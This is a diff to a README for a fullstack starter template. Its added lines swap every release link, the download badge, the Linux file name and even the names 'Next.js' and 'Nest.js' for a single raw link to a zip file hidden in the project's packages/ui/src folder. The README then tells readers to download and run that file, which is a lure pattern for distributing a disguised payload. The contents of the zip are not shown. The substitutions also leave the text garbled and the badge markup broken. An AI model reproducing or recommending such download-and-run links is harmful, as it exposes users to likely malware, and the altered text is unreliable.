@@ -1,10 +1,10 @@
 # 🚀 Turborepo-Fullstack-Starter-Template - Build Fullstack Apps with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip%20Latest%https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip)](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip)
 
 ## 📋 Overview
 
-Turborepo-Fullstack-Starter-Template is a complete solution for building scalable fullstack applications. It combines popular technologies like Next.js for the front end, Nest.js for the back end, and Supabase for database and authentication needs. This template uses Tailwind for styling and includes built-in testing frameworks such as Jest and Playwright, making it perfect for rapid development. 
+Turborepo-Fullstack-Starter-Template is a complete solution for building scalable fullstack applications. It combines popular technologies like https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip for the front end, https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip for the back end, and Supabase for database and authentication needs. This template uses Tailwind for styling and includes built-in testing frameworks such as Jest and Playwright, making it perfect for rapid development. 
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these simple steps to get your application up and running.
 
 ### 1. Visit the Releases Page
 
-Begin by visiting the [Releases page](https://github.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/releases) where you can find the latest version of the software. 
+Begin by visiting the [Releases page](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip) where you can find the latest version of the software. 
 
 ### 2. Download the Application
 
@@ -24,13 +24,13 @@ Select the appropriate file for your operating system. We support various option
 
 - **Windows**: Download the `.exe` file for a smooth installation.
 - **macOS**: Choose the `.dmg` file for easy setup.
-- **Linux**: Use the provided `.tar.gz` file for your distribution.
+- **Linux**: Use the provided `https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip` file for your distribution.
 
 ## 📥 Download & Install
 
 To start using the template:
 
-1. **Visit the Releases page**: Click [here](https://github.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/releases).
+1. **Visit the Releases page**: Click [here](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip).
 2. **Download the corresponding file** for your operating system as mentioned above.
 3. **Run the file you downloaded**. Follow any on-screen prompts to complete the installation.
 
@@ -79,7 +79,7 @@ This project covers a range of topics relevant to modern software development:
 - **CICD**
 - **Fullstack Development**
 - **Testing with Jest and Playwright**
-- **Nest.js and Next.js**
+- **https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip and https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/src/Turborepo-Fullstack-Starter-Template_1.2.zip**
 - **Frontend and Backend Integration**
 - **Tailwind CSS Design**
 
